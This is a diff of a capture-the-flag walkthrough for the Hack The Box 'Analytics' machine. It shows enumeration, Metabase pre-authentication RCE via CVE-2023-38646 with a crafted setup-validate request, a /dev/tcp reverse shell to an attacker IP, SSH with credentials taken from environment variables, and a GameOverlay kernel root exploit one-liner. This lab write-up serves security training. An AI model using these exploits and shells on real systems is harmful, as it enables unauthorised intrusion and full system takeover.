@@ -1,6 +1,8 @@
 ## About Analytics
 Analytics is an easy difficulty Linux machine with exposed HTTP and SSH services. Enumeration of the website reveals a `Metabase` instance, which is vulnerable to Pre-Authentication Remote Code Execution (`[CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)`), which is leveraged to gain a foothold inside a Docker container. Enumerating the Docker container we see that the environment variables set contain credentials that can be used to SSH into the host. Post-exploitation enumeration reveals that the kernel version that is running on the host is vulnerable to `GameOverlay`, which is leveraged to obtain root privileges.
 
+I began my enumeration with a basic service/version scan against the target:
+
 
 ```bash
  nmap -sV 10.129.229.224
@@ -17,7 +19,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
 ```
 
-On my next scan I targeted it towards the two open ports I found before:
+Only ports 22 (SSH) and 80 (HTTP) were open.
+
+
+
+I followed up with a more detailed scan targeting the discovered ports:
+
 
 ```bash 
 nmap -sCV -p22,80 10.129.229.224
@@ -41,7 +48,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
 ```a
 
-I performed a vhost scan with gobuster using: 
+Given the redirect, I performed a vhost scan using Gobuster:
 
 ```bash
 gobuster vhost -u http://analytical.htb:80  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
@@ -65,8 +72,9 @@ Progress: 114441 / 114442 (100.00%)
 Finished
 ===============================================================
 ```
-
-I navigated to the discovered host and notice it was running a version of Metabase 
+> Discovery: data.analytical.htb
+> 
+I browsed to http://data.analytical.htb and identified the service as Metabase. To confirm the version:
 
 ```bash
 curl -s http://data.analytical.htb/api/session/properties | jq '.version'
@@ -78,43 +86,33 @@ curl -s http://data.analytical.htb/api/session/properties | jq '.version'
 }
 
 ```
-Researched for vulneraibilities with that version number, and I found CVE-2023-38646
+This version is vulnerable to CVE-2023-38646, which allows unauthenticated remote code execution.
+
 
 > Description
 >Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1 allow attackers to execute arbitrary commands on the server, at the server's privilege level. Authentication is not required for exploitation.
 
-```bash
-git clone https://github.com/securezeron/CVE-2023-38646
-Cloning into 'CVE-2023-38646'...
-remote: Enumerating objects: 15, done.
-remote: Counting objects: 100% (15/15), done.
-remote: Compressing objects: 100% (10/10), done.
-remote: Total 15 (delta 1), reused 5 (delta 0), pack-reused 0 (from 0)
-Receiving objects: 100% (15/15), 5.70 KiB | 5.70 MiB/s, done.
-Resolving deltas: 100% (1/1), done.
-
-cd CVE-2023-38646
-
-pip install -r requirements.txt
-```
+Then I retrieved the setup token:
 
 ```bash
 curl -s http://data.analytical.htb/api/session/properties | jq -r '.["setup-token"]'
 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
 ```
-```created payload
-echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.126/8888 0>&1' > rev.sh
-```
+I prepared a simple reverse shell:
+
 ```bash
+echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.126/8888 0>&1' > rev.sh
+
  python3 -m http.server 8081
 Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
 
 ```
 
 
-I captured an request on Burp intruder and then send a post request method to Repeater: 
+Then, using Burp Suite, I crafted the following malicious POST request to trigger RCE:
 
-```bash
+
+```h
 POST /api/setup/validate HTTP/1.1
 Host: data.analytical.htb
 Content-Type: application/json
@@ -144,9 +142,8 @@ Content-Length: 783
 }
 
 ```
-This got me a reverse shell as the user metabase
-
-```shell
+As soon as I send the post request I obtained the reverse shell as the user metabase.
+```bash
 listening on [any] 8888 ...
 connect to [10.10.14.126] from (UNKNOWN) [10.129.229.224] 44056
 sh: can't access tty; job control turned off
@@ -154,8 +151,9 @@ sh: can't access tty; job control turned off
 metabase
 / $ 
 ```
-I printed shell's environment variables and found the password An4lytics_ds20223#
-```shell
+While exploring the environment variables, I found credentials:
+
+```bash
 / $ env
 MB_LDAP_BIND_DN=
 LANGUAGE=en_US:en
@@ -186,7 +184,7 @@ JAVA_HOME=/opt/java/openjdk
 PWD=/
 MB_DB_FILE=//metabase.db/metabase.db
 ```
-I ssh to 
+Using the credentials found, I successfully SSH'd into the box:
 
 ```bash
 
@@ -194,14 +192,15 @@ ssh metalytics@10.129.229.224
 
 ```
 
+### User flag:
 
 
 ```bash
 metalytics@analytics:~$ cat user.txt
 435a95bcf16c627c8d9e841640cfefa5
 ```
+I checked system version info:
 
-Enumerated the kernel version to view known issues:
 
 ```bash
 metalytics@analytics:~$ uname -a
@@ -217,8 +216,10 @@ Release:	22.04
 Codename:	jammy
 ```
 
-Ubuntu 22.04.3 with kernel 6.2.0-25 is potentially vulnerable to several security issues, including those related to OverlayFS, the Linux kernel, and other subsystems. Specifically, the OverlayFS module in Ubuntu has been identified with vulnerabilities related to permission checks, potentially allowing local privilege escalation.
 
+This kernel is vulnerable to OverlayFS-based privilege escalation (unprivileged user namespace enabled + setcap support).
+
+I crafted a local root exploit:
 
 
 ```bash
@@ -227,13 +228,14 @@ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
 setcap cap_setuid+eip l/python3;mount -t overlay overlay -o
 rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import
 os;os.setuid(0);os.system("/bin/bash")'
-
-
-
+```
+Then: 
+```bash
 metalytics@analytics:~$ chmod +x shell.sh
 metalytics@analytics:~$ ./shell.sh
 ```
 
+ I got a root shell.
 ```bash
 root@analytics:/root# cat /root/root.txt
 fd82c29e675087eb6017ab6b571dd97a
